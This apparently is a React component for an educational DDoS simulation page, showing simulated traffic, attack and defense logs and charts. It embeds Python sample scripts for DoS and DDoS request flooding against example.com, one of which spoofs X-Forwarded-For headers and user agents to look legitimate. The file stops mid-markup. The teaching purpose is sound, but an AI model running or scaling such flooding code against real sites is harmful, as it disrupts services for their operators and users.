import React, { useState, useContext, useEffect, useCallback, useMemo, useRef } from 'react';
import { SimulationContext } from '../SimulationPage';
import { Chart } from 'react-google-charts';

const DDosPage = () => {
  const {
    setTerminalLogs,
    setTerminalCode,
    setStatus,
    setRequestsReceived,
    setResponseTime,
  } = useContext(SimulationContext);

  const [isNormalRunning, setIsNormalRunning] = useState(false);
  const [isDosRunning, setIsDosRunning] = useState(false);
  const [isDdosRunning, setIsDdosRunning] = useState(false);
  const [isLayer3Running, setIsLayer3Running] = useState(false);
  const [isLayer7Running, setIsLayer7Running] = useState(false);
  const [isDefenseRunning, setIsDefenseRunning] = useState(false);
  const [attackType, setAttackType] = useState('normal');
  const [defenseMode, setDefenseMode] = useState('passive');
  const [defenseActive, setDefenseActive] = useState(false);
  const [blockedIPs, setBlockedIPs] = useState([]);
  const [detectedThreats, setDetectedThreats] = useState(0);
  const [chartData, setChartData] = useState([
    ['Time', 'Normal Traffic', 'Attack Traffic', 'Blocked Traffic'],
    [0, 0, 0, 0], // Initial data point
  ]);

  // Refs for intervals to prevent memory leaks
  const intervalRef = useRef(null);

  // Reset chart when component unmounts
  useEffect(() => {
    return () => {
      if (intervalRef.current) {
        clearInterval(intervalRef.current);
      }
      setChartData([['Time', 'Normal Traffic', 'Attack Traffic', 'Blocked Traffic'], [0, 0, 0, 0]]);
      setTerminalLogs([]);
      setStatus('Normal');
      setRequestsReceived(0);
      setResponseTime(100);
    };
  }, [setRequestsReceived, setResponseTime, setStatus, setTerminalLogs]);

  // Function to add logs to the terminal (without showing the code)
  const addLog = (message) => {
    setTerminalLogs((prevLogs) => [...prevLogs, message]);
  };

  // Function to update the chart data
  const updateChart = (time, normalTraffic, attackTraffic, blockedTraffic) => {
    setChartData((prevData) => [...prevData, [time, normalTraffic, attackTraffic, blockedTraffic]]);
  };

  // Function to generate realistic IP addresses
  const generateRealisticIP = () => {
    const countries = ['US', 'CN', 'RU', 'DE', 'FR', 'GB', 'JP', 'BR', 'IN', 'CA'];
    const country = countries[Math.floor(Math.random() * countries.length)];
    const ip = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
    return { ip, country };
  };

  // Function to simulate defense mechanisms
  const simulateDefenseMechanisms = () => {
    setIsDefenseRunning(true);
    setDefenseActive(true);
    setDefenseMode('active');
    setTerminalLogs([]);
    setStatus('Defense Systems Active');
    addLog('🛡️ Initializing Advanced DDoS Defense Systems...');
    addLog('🔍 Starting Multi-Layer Traffic Analysis...');
    addLog('⚡ Rate Limiting: 100 req/min per IP');
    addLog('🛡️ WAF: Scanning for malicious patterns...');
    addLog('🌐 Geo-blocking: Blocking suspicious regions...');
    addLog('📊 Behavioral Analysis: Monitoring traffic patterns...');
    addLog('🔬 Machine Learning: Training anomaly detection...');
    addLog('🌊 Flow Analysis: Monitoring connection states...');
    
    let time = 0;
    const interval = setInterval(() => {
      time += 1;
      
      // Simulate defense actions
      if (time % 3 === 0) {
        const { ip, country } = generateRealisticIP();
        if (Math.random() > 0.7) {
          const reasons = [
            'High request rate',
            'Suspicious connection pattern',
            'Port scanning detected',
            'SYN flood attempt',
            'Geographic anomaly',
            'Behavioral deviation'
          ];
          const reason = reasons[Math.floor(Math.random() * reasons.length)];
          setBlockedIPs(prev => [...prev, { ip, country, reason }]);
          addLog(`🚫 Blocked IP ${ip} (${country}) - Reason: ${reason}`);
          setDetectedThreats(prev => prev + 1);
        }
      }
      
      if (time % 5 === 0) {
        addLog(`📈 Defense Status: ${detectedThreats} threats detected, ${blockedIPs.length} IPs blocked`);
        addLog(`🎯 Attack Type: ${attackType} | Defense Mode: ${defenseMode}`);
      }
      
      if (time >= 15) {
        clearInterval(interval);
        setIsDefenseRunning(false);
        setStatus('Defense Systems Monitoring');
        addLog('✅ Advanced defense systems fully operational and monitoring traffic');
        addLog('🔒 All protection layers active: WAF, Rate Limiting, Geo-blocking, ML Detection');
      }
    }, 1000);
    
    return () => clearInterval(interval);
  };

  // Function to simulate advanced threat detection
  const simulateThreatDetection = () => {
    setTerminalLogs([]);
    addLog('🔍 Advanced Threat Detection Simulation...');
    addLog('📊 Analyzing network patterns...');
    addLog('🤖 Machine Learning models processing...');
    addLog('🔬 Deep packet inspection active...');
    addLog('📈 Baseline establishment complete');
    addLog('⚠️ Threat scoring algorithm initialized');
    addLog('🎯 Multi-vector attack detection enabled');
  };

  // Function to simulate adaptive defense
  const simulateAdaptiveDefense = () => {
    setTerminalLogs([]);
    addLog('🧠 Adaptive Defense System Activated...');
    addLog('📚 Learning from attack patterns...');
    addLog('🔄 Auto-tuning detection thresholds...');
    addLog('⚡ Dynamic rate limiting adjustment...');
    addLog('🛡️ Self-healing defense mechanisms...');
    addLog('📊 Real-time threat intelligence updates...');
  };

  // Function to simulate incident response
  const simulateIncidentResponse = () => {
    setTerminalLogs([]);
    addLog('🚨 Incident Response Protocol Activated...');
    addLog('📞 Alerting security team...');
    addLog('📝 Logging attack details...');
    addLog('🔒 Implementing emergency blocks...');
    addLog('📊 Generating threat report...');
    addLog('🔄 Updating defense signatures...');
    addLog('✅ Incident response complete');
  };

  // Function to simulate Layer 3/4 attacks (Network/Transport layer)
  const simulateLayer3Attack = () => {
    setIsLayer3Running(true);
    setAttackType('layer3');
    setTerminalLogs([]);
    setStatus('Under Layer 3/4 Attack');
    addLog('🌐 Layer 3/4 DDoS Attack Detected!');
    addLog('📡 Attack Type: SYN Flood + UDP Flood');
    addLog('🎯 Target: Network Infrastructure');
    
    let time = 0;
    let normalTraffic = 0;
    let attackTraffic = 0;
    let blockedTraffic = 0;
    
    const interval = setInterval(() => {
      time += 1;
      
      // Normal traffic (reduced due to attack)
      normalTraffic += Math.floor(Math.random() * 3) + 1;
      
      // Layer 3/4 attack traffic (high volume)
      const attackPackets = Math.floor(Math.random() * 50) + 30;
      attackTraffic += attackPackets;
      
      // Defense blocking
      if (defenseActive) {
        const blocked = Math.floor(attackPackets * 0.6);
        blockedTraffic += blocked;
        addLog(`🛡️ Blocked ${blocked} malicious packets from ${Math.floor(Math.random() * 10) + 1} IPs`);
      }
      
      setRequestsReceived(normalTraffic + attackTraffic);
      setResponseTime(100 + time * 20);
      updateChart(time, normalTraffic, attackTraffic, blockedTraffic);
      
      if (time >= 12) {
        clearInterval(interval);
        setIsLayer3Running(false);
        setStatus('Layer 3/4 Attack Mitigated');
        addLog('✅ Layer 3/4 attack successfully mitigated by defense systems');
      } else {
        addLog(`📊 Time ${time}s: Normal: ${normalTraffic}, Attack: ${attackTraffic}, Blocked: ${blockedTraffic}`);
      }
    }, 1000);
    
    return () => clearInterval(interval);
  };

  // Function to simulate Layer 7 attacks (Application layer)
  const simulateLayer7Attack = () => {
    setIsLayer7Running(true);
    setAttackType('layer7');
    setTerminalLogs([]);
    setStatus('Under Layer 7 Attack');
    addLog('🌐 Layer 7 DDoS Attack Detected!');
    addLog('📡 Attack Type: HTTP Flood + Slowloris');
    addLog('🎯 Target: Web Application');
    
    let time = 0;
    let normalTraffic = 0;
    let attackTraffic = 0;
    let blockedTraffic = 0;
    
    const attackPatterns = [
      'GET /api/users HTTP/1.1',
      'POST /login HTTP/1.1',
      'GET /search?q=test HTTP/1.1',
      'GET /admin HTTP/1.1',
      'POST /api/data HTTP/1.1'
    ];
    
    const interval = setInterval(() => {
      time += 1;
      
      // Normal traffic
      normalTraffic += Math.floor(Math.random() * 5) + 2;
      
      // Layer 7 attack traffic (HTTP requests)
      const attackRequests = Math.floor(Math.random() * 25) + 15;
      attackTraffic += attackRequests;
      
      // Defense blocking
      if (defenseActive) {
        const blocked = Math.floor(attackRequests * 0.7);
        blockedTraffic += blocked;
        const pattern = attackPatterns[Math.floor(Math.random() * attackPatterns.length)];
        addLog(`🛡️ Blocked ${blocked} malicious requests: ${pattern}`);
      }
      
      setRequestsReceived(normalTraffic + attackTraffic);
      setResponseTime(150 + time * 30);
      updateChart(time, normalTraffic, attackTraffic, blockedTraffic);
      
      if (time >= 12) {
        clearInterval(interval);
        setIsLayer7Running(false);
        setStatus('Layer 7 Attack Mitigated');
        addLog('✅ Layer 7 attack successfully mitigated by WAF and rate limiting');
      } else {
        addLog(`📊 Time ${time}s: Normal: ${normalTraffic}, Attack: ${attackTraffic}, Blocked: ${blockedTraffic}`);
      }
    }, 1000);
    
    return () => clearInterval(interval);
  };

  // Function to simulate normal traffic
  const simulateNormalTraffic = () => {
    setIsNormalRunning(true);
    setAttackType('normal');
    setTerminalLogs([]);
    setStatus('Normal Traffic');
    setRequestsReceived(0);
    setChartData([['Time', 'Normal Traffic', 'Attack Traffic', 'Blocked Traffic'], [0, 0, 0, 0]]);
    addLog('🌐 Starting Normal Traffic Simulation...');
    addLog('👥 Simulating legitimate user behavior...');

    let time = 0;
    let normalTraffic = 0;
    const interval = setInterval(() => {
      time += 1;
      const newRequests = Math.floor(Math.random() * 5) + 1;
      normalTraffic += newRequests;
      setResponseTime(100 + Math.floor(Math.random() * 20)); // Normal response time with slight variation
      setRequestsReceived(normalTraffic);
      updateChart(time, normalTraffic, 0, 0);

      if (time >= 10) {
        clearInterval(interval);
        setStatus('Normal Traffic Ended');
        setIsNormalRunning(false);
        addLog('✅ Normal Traffic Simulation Completed Successfully');
        addLog(`📊 Total legitimate requests processed: ${normalTraffic}`);
      } else {
        const { ip, country } = generateRealisticIP();
        addLog(`👤 Request ${normalTraffic}: ${ip} (${country}) - Status 200 OK (${Math.floor(Math.random() * 50) + 80}ms)`);
      }
    }, 1000);

    return () => clearInterval(interval);
  };

  // Function to simulate a DoS attack
  const simulateDosAttack = () => {
    setIsDosRunning(true);
    setAttackType('dos');
    setTerminalLogs([]);
    setStatus('Under DoS Attack...');
    setRequestsReceived(0);
    setChartData([['Time', 'Normal Traffic', 'Attack Traffic', 'Blocked Traffic'], [0, 0, 0, 0]]);
    addLog('⚠️ Starting DoS Attack Simulation...');
    addLog('🎯 Single-source attack detected!');

    let time = 0;
    let normalTraffic = 0;
    let attackTraffic = 0;
    let blockedTraffic = 0;
    const attackerIP = '192.168.1.100';
    
    const interval = setInterval(() => {
      time += 1;
      
      // Normal traffic (reduced due to attack)
      normalTraffic += Math.floor(Math.random() * 3) + 1;
      
      // DoS attack traffic (single source)
      const newAttackRequests = Math.floor(Math.random() * 10) + 15;
      attackTraffic += newAttackRequests;
      
      // Defense blocking
      if (defenseActive) {
        const blocked = Math.floor(newAttackRequests * 0.4);
        blockedTraffic += blocked;
        addLog(`🛡️ Blocked ${blocked} requests from ${attackerIP}`);
      }
      
      const responseTime = 100 + time * 50;
      setResponseTime(responseTime);
      setRequestsReceived(normalTraffic + attackTraffic);
      updateChart(time, normalTraffic, attackTraffic, blockedTraffic);

      if (time >= 10) {
        clearInterval(interval);
        setStatus('DoS Attack Stopped');
        setIsDosRunning(false);
        addLog('✅ DoS Attack Simulation Ended');
        addLog(`📊 Attack Impact: ${attackTraffic} malicious requests, ${blockedTraffic} blocked`);
      } else {
        addLog(`🚨 Received ${newAttackRequests} requests from ${attackerIP} (DoS)`);
        addLog(`📈 Response time: ${responseTime}ms (degraded)`);
      }
    }, 1000);

    return () => clearInterval(interval);
  };

  // Function to simulate a DDoS attack
  const simulateDdosAttack = () => {
    setIsDdosRunning(true);
    setAttackType('ddos');
    setTerminalLogs([]);
    setStatus('Under DDoS Attack...');
    setRequestsReceived(0);
    setChartData([['Time', 'Normal Traffic', 'Attack Traffic', 'Blocked Traffic'], [0, 0, 0, 0]]);
    addLog('🚨 Starting DDoS Attack Simulation...');
    addLog('🌐 Botnet detected - Multiple IPs sending high volume traffic...');
    addLog('⚠️ This is a distributed attack from multiple sources!');

    let time = 0;
    let normalTraffic = 0;
    let attackTraffic = 0;
    let blockedTraffic = 0;
    const botnetIPs = [];
    
    // Generate botnet IPs
    for (let i = 0; i < 5; i++) {
      const { ip, country } = generateRealisticIP();
      botnetIPs.push({ ip, country });
    }
    
    const interval = setInterval(() => {
      time += 1;
      
      // Normal traffic (severely reduced due to attack)
      normalTraffic += Math.floor(Math.random() * 2) + 1;
      
      // DDoS attack traffic (high volume from multiple sources)
      const newAttackRequests = Math.floor(Math.random() * 30) + 40;
      attackTraffic += newAttackRequests;
      
      // Defense blocking
      if (defenseActive) {
        const blocked = Math.floor(newAttackRequests * 0.5);
        blockedTraffic += blocked;
        addLog(`🛡️ Blocked ${blocked} requests from botnet`);
      }
      
      const responseTime = 100 + Math.min(time * 100, 1000);
      setResponseTime(responseTime);
      setRequestsReceived(normalTraffic + attackTraffic);
      updateChart(time, normalTraffic, attackTraffic, blockedTraffic);

      if (time >= 10) {
        clearInterval(interval);
        setStatus('DDoS Attack Overwhelmed Server');
        setIsDdosRunning(false);
        addLog('💥 DDoS Attack Simulation Ended');
        addLog('❌ Server overwhelmed - Service unavailable');
        addLog(`📊 Total Impact: ${attackTraffic} malicious requests, ${blockedTraffic} blocked`);
        addLog('🚨 ERROR: Connection timeout for new requests');
      } else {
        // Generate attack from random botnet IPs
        const activeIPs = botnetIPs.slice(0, Math.floor(Math.random() * 3) + 2);
        activeIPs.forEach(({ ip, country }) => {
          const requestsFromIP = Math.floor(newAttackRequests / activeIPs.length);
          addLog(`🤖 Botnet: ${ip} (${country}) - ${requestsFromIP} requests`);
        });
        addLog(`📈 Response time: ${responseTime}ms (critical)`);
        if (time > 5) {
          addLog('⚠️ WARNING: Server resources reaching critical levels');
        }
      }
    }, 1000);

    return () => clearInterval(interval);
  };

  // Sample code for normal traffic simulation
  const normalCode = `import requests
import time
import random

URL = "https://example.com"  # Target website URL
REQUESTS = 10  # Total number of requests to send

print("Starting normal web traffic simulation...")

for i in range(REQUESTS):
    try:
        # Send a GET request to the target URL
        response = requests.get(URL)
        
        # Print the status code and response time
        print(f"Request {i+1}: Status {response.status_code}, Time: {response.elapsed.total_seconds()*1000:.2f}ms")
        
        # Simulate realistic user behavior with random delays between 1-3 seconds
        delay = random.uniform(1, 3)
        time.sleep(delay)
        
    except Exception as e:
        print(f"Error making request: {e}")

print("Normal traffic simulation complete.")`;

  // Sample code for DoS attack simulation
  const dosCode = `import requests
import threading
import time

TARGET_URL = "https://example.com"  # Target website URL
THREADS = 5      # Number of concurrent threads
REQUESTS_PER_THREAD = 50  # Requests per thread
REQUEST_TIMEOUT = 2  # Timeout for each request (seconds)

def send_requests():
    """Function to send multiple requests from a single thread"""
    thread_name = threading.current_thread().name
    print(f"{thread_name} started sending requests")
    
    success_count = 0
    failed_count = 0
    
    for i in range(REQUESTS_PER_THREAD):
        try:
            # Send GET request with timeout
            start_time = time.time()
            response = requests.get(TARGET_URL, timeout=REQUEST_TIMEOUT)
            elapsed = (time.time() - start_time) * 1000  # Convert to milliseconds
            
            print(f"{thread_name}: Request {i+1} - Status {response.status_code}, Time: {elapsed:.2f}ms")
            success_count += 1
            
        except requests.exceptions.Timeout:
            print(f"{thread_name}: Request {i+1} - TIMEOUT")
            failed_count += 1
        except Exception as e:
            print(f"{thread_name}: Request {i+1} - ERROR: {str(e)}")
            failed_count += 1
    
    print(f"{thread_name} completed. Success: {success_count}, Failed: {failed_count}")

print("Starting DoS simulation...")
print(f"Target: {TARGET_URL}")
print(f"Creating {THREADS} threads with {REQUESTS_PER_THREAD} requests each")

# Create and start multiple threads
threads = []
for i in range(THREADS):
    thread = threading.Thread(target=send_requests, name=f"Thread-{i+1}")
    thread.start()
    threads.append(thread)
    print(f"Thread-{i+1} started")

# Wait for all threads to complete
for thread in threads:
    thread.join()

print("DoS simulation completed")`;

  // Sample code for DDoS attack simulation
  const ddosCode = `import asyncio
import aiohttp
import time
import random

# Configuration
TARGET_URL = "https://example.com"  # Target website
TOTAL_REQUESTS = 500  # Total number of requests to send
MAX_CONCURRENT = 100  # Maximum number of concurrent requests
IP_COUNT = 25         # Number of different IPs to simulate

# Generate random IP addresses to simulate distributed attack
def get_random_ip():
    return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"

# Create a list of simulated IP addresses
botnet_ips = [get_random_ip() for _ in range(IP_COUNT)]

# Sample user agents to make requests look more legitimate
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
    "Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X)",
]

async def send_request(session, request_id):
    # Select a random IP and user agent for this request
    ip = random.choice(botnet_ips)
    user_agent = random.choice(user_agents)
    
    # Set headers to simulate the request coming from different sources
    headers = {
        "User-Agent": user_agent,
        "X-Forwarded-For": ip,
        "Cache-Control": "no-cache"
    }
    
    start_time = time.time()
    
    try:
        async with session.get(TARGET_URL, headers=headers, timeout=5) as response:
            elapsed = (time.time() - start_time) * 1000  # Convert to ms
            print(f"Request {request_id+1} from {ip}: Status {response.status}, Time: {elapsed:.2f}ms")
            return True
    except asyncio.TimeoutError:
        print(f"Request {request_id+1} from {ip}: TIMEOUT")
        return False
    except Exception as e:
        print(f"Request {request_id+1} from {ip}: ERROR - {str(e)}")
        return False

async def main():
    print(f"Starting DDoS simulation against {TARGET_URL}")
    print(f"Sending {TOTAL_REQUESTS} requests from {IP_COUNT} different IPs")
    
    # Create a ClientSession to reuse connections
    async with aiohttp.ClientSession() as session:
        # Create tasks for all requests
        tasks = [send_request(session, i) for i in range(TOTAL_REQUESTS)]
        
        # Process requests in chunks to avoid overwhelming the machine running the script
        successes = 0
        failures = 0
        
        for i in range(0, len(tasks), MAX_CONCURRENT):
            chunk = tasks[i:i+MAX_CONCURRENT]
            results = await asyncio.gather(*chunk)
            
            successes += sum(results)
            failures += len(results) - sum(results)
            
            print(f"Progress: {i+len(chunk)}/{TOTAL_REQUESTS} requests processed")
            
            # Small delay between chunks to allow for console output
            await asyncio.sleep(0.1)
    
    print("DDoS simulation completed")
    print(f"Results: {successes} successful requests, {failures} failed requests")

# Run the async event loop
if __name__ == "__main__":
    asyncio.run(main())`;

  return (
    <div className="p-4 md:p-8">
      <h2 className="text-2xl font-bold mb-4">DDoS Attack Simulation</h2>
      <p className="mb-6 text-gray-300">
        This simulation demonstrates the behavior of web servers under various traffic conditions,
        from normal traffic to DoS and DDoS attacks. Click the buttons below to run different simulations
        and observe the impact on server response time and request handling capacity.
      </p>

      {/* Enhanced Chart for Visualization */}
      <div className="bg-gray-800 p-4 md:p-6 rounded-lg shadow-md mb-6">
        <Chart
          width={'100%'}
          height={'300px'}
          chartType="LineChart"
          loader={<div className="text-center py-8">Loading Chart...</div>}
          data={chartData}
          options={{
            title: 'Traffic Analysis Over Time',
            titleTextStyle: { color: '#e2e8f0' },
            backgroundColor: '#1f2937',
            colors: ['#10b981', '#ef4444', '#f59e0b'],
            curveType: 'function',
            legend: { position: 'bottom', textStyle: { color: '#e2e8f0' } },
            hAxis: { 
              title: 'Time (seconds)', 
              titleTextStyle: { color: '#e2e8f0' },
              textStyle: { color: '#e2e8f0' }
            },
            vAxis: { 
              title: 'Requests per Second', 
              titleTextStyle: { color: '#e2e8f0' },
              textStyle: { color: '#e2e8f0' }
            },
            chartArea: { width: '80%', height: '70%' }
          }}
        />
      </div>

      {/* Defense Status Dashboard */}
      {defenseActive && (
        <div className="bg-gray-800 p-4 md:p-6 rounded-lg shadow-md mb-6">
          <h3 className="text-xl font-semibold mb-4 text-green-400">🛡️ Defense Systems Status</h3>
          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
            <div className="bg-gray-700 p-4 rounded-lg">
              <h4 className="text-lg font-semibold text-blue-400">Threats Detected</h4>
              <p className="text-2xl font-bold text-red-400">{detectedThreats}</p>
            </div>
            <div className="bg-gray-700 p-4 rounded-lg">
              <h4 className="text-lg font-semibold text-blue-400">IPs Blocked</h4>
              <p className="text-2xl font-bold text-yellow-400">{blockedIPs.length}</p>
            </div>
            <div className="bg-gray-700 p-4 rounded-lg">
              <h4 className="text-lg font-semibold text-blue-400">Defense Status</h4>
              <p className="text-lg font-bold text-green-400">🟢 Active</p>
            </div>
          </div>
          {blockedIPs.length > 0 && (
            <div className="mt-4">
              <h4 className="text-lg font-semibold text-red-400 mb-2">Recently Blocked IPs:</h4>
              <div className="grid grid-cols-2 md:grid-cols-4 gap-2">
                {blockedIPs.slice(-8).map((blocked, index) => (
                  <div key={index} className="bg-red-900 p-2 rounded text-sm">
                    <p className="text-red-300">{blocked.ip}</p>
                    <p className="text-red-400 text-xs">{blocked.country}</p>
                  </div>
                ))}
              </div>
            </div>
          )}
        </div>
      )}

     {/* Simulation Controls */}
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 mb-6">
        {/* Normal Traffic Section */}
        <div className="bg-[#1e293b] p-6 rounded-lg shadow-md border border-gray-700">
          <div className="flex items-center mb-4">
            <div className="w-3 h-3 rounded-full bg-green-500 mr-2"></div>
            <h3 className="text-xl font-semibold">Normal Traffic</h3>
          </div>
          <p className="mb-4 text-sm">
            Regular user traffic accessing the server with reasonable intervals between requests.
          </p>
          <ul className="text-xs text-gray-400 mb-4 pl-4 list-disc">
            <li>Multiple unique IP addresses</li>
            <li>Various browser signatures</li>
            <li>Natural access patterns</li>
            <li>Low server resource usage</li>
          </ul>
          <button
            className={`w-full px-4 py-2 rounded ${
              isNormalRunning ? 'bg-gray-600' : 'bg-green-600 hover:bg-green-700'
            } text-white`}
            onClick={() => {
              setTerminalCode('');
              simulateNormalTraffic();
            }}
            disabled={isNormalRunning || isDosRunning || isDdosRunning || isLayer3Running || isLayer7Running}
          >
            {isNormalRunning ? 'Running...' : 'Start Normal Traffic'}
          </button>
        </div>

        {/* DoS Attack Section */}
        <div className="bg-[#1e293b] p-6 rounded-lg shadow-md border border-gray-700">
          <div className="flex items-center mb-4">
            <div className="w-3 h-3 rounded-full bg-yellow-500 mr-2"></div>
            <h3 className="text-xl font-semibold">DoS Attack</h3>
          </div>
          <p className="mb-4 text-sm">
            Attack from a single source sending rapidly repeated requests to overwhelm the server.
          </p>
          <ul className="text-xs text-gray-400 mb-4 pl-4 list-disc">
            <li>Single source IP address</li>
            <li>High frequency of requests</li>
            <li>Minimal variation in request patterns</li>
            <li>Growing server response time</li>
          </ul>
          <button
            className={`w-full px-4 py-2 rounded ${
              isDosRunning ? 'bg-gray-600' : 'bg-yellow-600 hover:bg-yellow-700'
            } text-white`}
            onClick={() => {
              setTerminalCode('');
              simulateDosAttack();
            }}
            disabled={isNormalRunning || isDosRunning || isDdosRunning || isLayer3Running || isLayer7Running}
          >
            {isDosRunning ? 'Running...' : 'Start DoS Attack'}
          </button>
        </div>

        {/* DDoS Attack Section */}
        <div className="bg-[#1e293b] p-6 rounded-lg shadow-md border border-gray-700">
          <div className="flex items-center mb-4">
            <div className="w-3 h-3 rounded-full bg-red-500 mr-2"></div>
            <h3 className="text-xl font-semibold">DDoS Attack</h3>
          </div>
          <p className="mb-4 text-sm">
            Coordinated attack from multiple sources (botnet) that quickly overwhelms server resources.
          </p>
          <ul className="text-xs text-gray-400 mb-4 pl-4 list-disc">
            <li>Multiple attacking IP addresses</li>
            <li>Massive request volume</li>
            <li>Distributed geographic origins</li>
            <li>Rapid server resource exhaustion</li>
          </ul>
          <button
            className={`w-full px-4 py-2 rounded ${
              isDdosRunning ? 'bg-gray-600' : 'bg-red-600 hover:bg-red-700'
            } text-white`}
            onClick={() => {
              setTerminalCode('');
              simulateDdosAttack();
            }}
            disabled={isNormalRunning || isDosRunning || isDdosRunning || isLayer3Running || isLayer7Running}
          >
            {isDdosRunning ? 'Running...' : 'Start DDoS Attack'}
          </button>
        </div>

        {/* Layer 3/4 Attack Section */}
        <div className="bg-[#1e293b] p-6 rounded-lg shadow-md border border-gray-700">
          <div className="flex items-center mb-4">
            <div className="w-3 h-3 rounded-full bg-orange-500 mr-2"></div>
            <h3 className="text-xl font-semibold">Layer 3/4 Attack</h3>
          </div>
          <p className="mb-4 text-sm">
            Network/Transport layer attacks targeting infrastructure with SYN floods and UDP floods.
          </p>
          <ul className="text-xs text-gray-400 mb-4 pl-4 list-disc">
            <li>SYN flood attacks</li>
            <li>UDP flood attacks</li>
            <li>Network infrastructure target</li>
            <li>High packet volume</li>
          </ul>
          <button
            className={`w-full px-4 py-2 rounded ${
              isLayer3Running ? 'bg-gray-600' : 'bg-orange-600 hover:bg-orange-700'
            } text-white`}
            onClick={() => {
              setTerminalCode('');
              simulateLayer3Attack();
            }}
            disabled={isNormalRunning || isDosRunning || isDdosRunning || isLayer3Running || isLayer7Running}
          >
            {isLayer3Running ? 'Running...' : 'Start Layer 3/4 Attack'}
          </button>
        </div>

        {/* Layer 7 Attack Section */}
        <div className="bg-[#1e293b] p-6 rounded-lg shadow-md border border-gray-700">
          <div className="flex items-center mb-4">
            <div className="w-3 h-3 rounded-full bg-purple-500 mr-2"></div>
            <h3 className="text-xl font-semibold">Layer 7 Attack</h3>
          </div>
          <p className="mb-4 text-sm">
            Application layer attacks targeting web applications with HTTP floods and Slowloris.
          </p>
          <ul className="text-xs text-gray-400 mb-4 pl-4 list-disc">
            <li>HTTP flood attacks</li>
            <li>Slowloris attacks</li>
            <li>Web application target</li>
            <li>Resource exhaustion</li>
          </ul>
          <button
            className={`w-full px-4 py-2 rounded ${
              isLayer7Running ? 'bg-gray-600' : 'bg-purple-600 hover:bg-purple-700'
            } text-white`}
            onClick={() => {
              setTerminalCode('');
              simulateLayer7Attack();
            }}
            disabled={isNormalRunning || isDosRunning || isDdosRunning || isLayer3Running || isLayer7Running}
          >
            {isLayer7Running ? 'Running...' : 'Start Layer 7 Attack'}
          </button>
        </div>

        {/* Defense Systems Section */}
        <div className="bg-[#1e293b] p-6 rounded-lg shadow-md border border-gray-700">
          <div className="flex items-center mb-4">
            <div className="w-3 h-3 rounded-full bg-blue-500 mr-2"></div>
            <h3 className="text-xl font-semibold">Defense Systems</h3>
          </div>
          <p className="mb-4 text-sm">
            Activate comprehensive defense mechanisms including WAF, rate limiting, and behavioral analysis.
          </p>
          <ul className="text-xs text-gray-400 mb-4 pl-4 list-disc">
            <li>Web Application Firewall</li>
            <li>Rate limiting per IP</li>
            <li>Behavioral analysis</li>
            <li>Geo-blocking</li>
          </ul>
          <button
            className={`w-full px-4 py-2 rounded ${
              isDefenseRunning ? 'bg-gray-600' : 'bg-blue-600 hover:bg-blue-700'
            } text-white`}
            onClick={() => {
              setTerminalCode('');
              simulateDefenseMechanisms();
            }}
            disabled={isDefenseRunning}
          >
            {isDefenseRunning ? 'Activating...' : 'Activate Defense Systems'}
          </button>
        </div>
      </div>

      {/* Advanced Defense Controls */}
      <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-6">
        {/* Threat Detection Section */}
        <div className="bg-[#1e293b] p-6 rounded-lg shadow-md border border-gray-700">
          <div className="flex items-center mb-4">
            <div className="w-3 h-3 rounded-full bg-cyan-500 mr-2"></div>
            <h3 className="text-xl font-semibold">Threat Detection</h3>
          </div>
          <p className="mb-4 text-sm">
            Advanced threat detection using machine learning and behavioral analysis.
          </p>
          <ul className="text-xs text-gray-400 mb-4 pl-4 list-disc">
            <li>Machine Learning models</li>
            <li>Deep packet inspection</li>
            <li>Threat scoring algorithm</li>
            <li>Multi-vector detection</li>
          </ul>
          <button
            className="w-full px-4 py-2 rounded bg-cyan-600 hover:bg-cyan-700 text-white"
            onClick={() => {
              setTerminalCode('');
              simulateThreatDetection();
            }}
          >
            Simulate Threat Detection
          </button>
        </div>

        {/* Adaptive Defense Section */}
        <div className="bg-[#1e293b] p-6 rounded-lg shadow-md border border-gray-700">
          <div className="flex items-center mb-4">
            <div className="w-3 h-3 rounded-full bg-indigo-500 mr-2"></div>
            <h3 className="text-xl font-semibold">Adaptive Defense</h3>
          </div>
          <p className="mb-4 text-sm">
            Self-learning defense systems that adapt to new attack patterns automatically.
          </p>
          <ul className="text-xs text-gray-400 mb-4 pl-4 list-disc">
            <li>Auto-tuning thresholds</li>
            <li>Pattern learning</li>
            <li>Dynamic rate limiting</li>
            <li>Self-healing mechanisms</li>
          </ul>
          <button
            className="w-full px-4 py-2 rounded bg-indigo-600 hover:bg-indigo-700 text-white"
            onClick={() => {
              setTerminalCode('');
              simulateAdaptiveDefense();
            }}
          >
            Simulate Adaptive Defense
          </button>
        </div>

        {/* Incident Response Section */}
        <div className="bg-[#1e293b] p-6 rounded-lg shadow-md border border-gray-700">
          <div className="flex items-center mb-4">
            <div className="w-3 h-3 rounded-full bg-red-500 mr-2"></div>
            <h3 className="text-xl font-semibold">Incident Response</h3>
          </div>
          <p className="mb-4 text-sm">
            Automated incident response protocols for handling detected attacks.
          </p>
          <ul className="text-xs text-gray-400 mb-4 pl-4 list-disc">
            <li>Security team alerting</li>
            <li>Attack logging</li>
            <li>Emergency blocks</li>
            <li>Threat reporting</li>
          </ul>
          <button
            className="w-full px-4 py-2 rounded bg-red-600 hover:bg-red-700 text-white"
            onClick={() => {
              setTerminalCode('');
              simulateIncidentResponse();
            }}
          >
            Simulate Incident Response
          </button>
        </div>
      </div>

      {/* Normal Traffic Section */}
      <div className="bg-gray-800 p-4 md:p-6 rounded-lg shadow-md mb-6">
        <h3 className="text-xl font-semibold mb-4">Normal Traffic</h3>
        <p className="mb-4 text-gray-300">
          This simulates normal user traffic. The server handles requests efficiently with consistent, low response times.
          In normal traffic conditions, a server typically processes a small number of requests per second from different
          users, with minimal impact on performance.
        </p>
        <div className="bg-gray-900 text-gray-300 p-4 rounded-lg mb-4 overflow-x-auto">
          <pre className="whitespace-pre-wrap">{normalCode}</pre>
        </div>
      </div>

      {/* DoS Attack Section */}
